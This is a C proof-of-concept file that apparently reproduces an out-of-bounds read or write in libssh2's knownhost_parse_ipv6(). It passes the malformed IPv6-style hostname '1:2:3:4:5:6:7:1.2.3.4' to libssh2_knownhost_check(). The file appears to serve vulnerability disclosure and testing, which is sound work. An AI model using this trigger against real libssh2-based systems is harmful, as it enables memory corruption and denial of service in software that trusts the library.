/*
 * PoC: crafted plain-text known-hosts entry drives libssh2's IPv6 literal
 * comparison in knownhost_parse_ipv6() out of bounds.
 *
 * Reached purely through the public libssh2 known-hosts API, with no
 * network I/O: libssh2_knownhost_addc() stores a harmless entry, then
 * libssh2_knownhost_check() is asked about a second, attacker-controlled
 * hostname. The two names differ, so the fast exact-string match is
 * skipped and both are parsed as (candidate) IPv6 literals.
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    static const char key[] = "AAAA";
    const int typemask =
        LIBSSH2_KNOWNHOST_TYPE_PLAIN |
        LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
        LIBSSH2_KNOWNHOST_KEY_SSHRSA;
    int rc;

    if(libssh2_init(0))
        return 1;

    session = libssh2_session_init();
    if(!session)
        return 1;

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        libssh2_session_free(session);
        return 1;
    }

    rc = libssh2_knownhost_addc(hosts, "example.com", NULL, key, strlen(key),
                                NULL, 0, typemask, NULL);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_addc() failed: %d\n", rc);
        libssh2_knownhost_free(hosts);
        libssh2_session_free(session);
        return 1;
    }

    /* Seven plain groups followed by an embedded IPv4 tail: an invalid
       IPv6 literal (it would expand to nine 16-bit words), supplied as an
       ordinary attacker-controlled hostname argument. */
    rc = libssh2_knownhost_check(hosts, "1:2:3:4:5:6:7:1.2.3.4",
                                 key, strlen(key), typemask, NULL);

    printf("libssh2_knownhost_check() returned %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
